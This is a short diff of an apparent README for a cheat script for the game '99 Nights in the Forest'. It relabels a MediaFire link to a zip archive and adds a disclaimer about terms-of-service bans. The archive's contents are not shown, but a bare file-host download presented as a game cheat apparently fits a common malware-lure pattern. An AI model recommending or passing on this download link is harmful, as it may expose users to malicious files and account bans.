@@ -2,7 +2,7 @@
 99 Nights in the Forest
 
 
-[Click](https://www.mediafire.com/file/6i9s7eu7wju8utk/G2026.zip/file)
+[99 Nights in the Forest - Gameplay Enhancements Script](https://www.mediafire.com/file/6i9s7eu7wju8utk/G2026.zip/file)
 # 🌲 99 Nights in the Forest - Gameplay Enhancements Script
 
 **Disclaimer:** This script is designed to provide various gameplay enhancements in 99 Nights in the Forest. **Use it at your own risk.** The use of such scripts may violate the game's terms of service and could lead to account suspension or banning. This script is provided for informational and illustrative purposes only. I do not endorse or encourage cheating.  Your account security is your responsibility! 🔐
